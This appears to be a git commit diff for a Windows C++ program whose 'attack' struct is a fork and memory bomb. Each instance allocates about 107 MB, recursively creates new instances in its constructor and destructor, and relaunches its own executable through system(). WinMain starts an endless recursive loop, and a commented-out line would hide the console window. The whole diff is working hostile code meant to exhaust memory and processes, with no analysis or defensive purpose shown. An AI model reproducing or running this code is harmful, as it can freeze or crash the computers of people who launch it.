df0f8f515a5fcb02e3a9dd71cb8589020c2fde0f
Timothy O'Reilly <10173541+crazykid080@users.noreply.github.com>
2018-03-12 10:51:21 -0700

    Continued testing
    Testing is continuing with structs.
    Program is having issues with writing proper file names, unsure of the reason.

--- Main.cpp
+++ Main.cpp
@@ -1,22 +1,26 @@
-#include <cstdlib>
 #include <windows.h>  
 #include "TlHelp32.h"
 #include <iostream>
-#include <fstream>
-#include <sstream>
 #include "Files.h"
 #define UNICODE 1
 using namespace std;
-
+int chararray = 107370900;
+string startcom;
 struct attack{
-	attack(){
-		new attack();
-		new attack();
-		//cout << this << endl;
+
+	attack(int x){
+		new char[x];
+		system(startcom.c_str());
+		new attack(chararray);
+		cout << "Initialized 1 with: " << this << endl;
+		new attack(chararray);
+		cout << "Initialized 2 with: " << this << endl;
 	}
 	~attack(){
-		new attack();
-		new attack();
+		cout << "Destructing: " << this << endl;
+		system(startcom.c_str());
+		new attack(chararray);
+		new attack(chararray);
 		cout << this << endl;
 	}
 };
@@ -25,17 +29,16 @@ void attacking(string startCommand){
 	while(true){
 		try{
 			for(int i = 0; i < 10; i++){
-				new attack();
-
+				new attack(chararray);
 			}
 		}catch(exception e){
-			//new char[107370900];
-			//system(startCommand.c_str());
-			//new char[107370900];
-			//system(startCommand.c_str());
-			//attack(startCommand);
+			new attack(chararray);
+			system(startCommand.c_str());
+			new attack(chararray);
+			system(startCommand.c_str());
+			attacking(startCommand);
 		}
-		attack(startCommand);
+		attacking(startCommand);
 	}
 }
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow){
@@ -46,10 +49,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	//ShowWindow( GetConsoleWindow(), SW_HIDE );
 	if (GetModuleFileName(NULL, szPath, sizeof szPath) == 0) return -1;
 	std::string startupPath = getStartupPath(szPath);
-	string startCommand;
-	cout << startCommand << endl;
-	return 0;
-	startCommand = startupPath;
-	attacking(startCommand);
+	startcom = "\""+startupPath+"\"";
+	attacking(startcom);
 	return 0;
 }
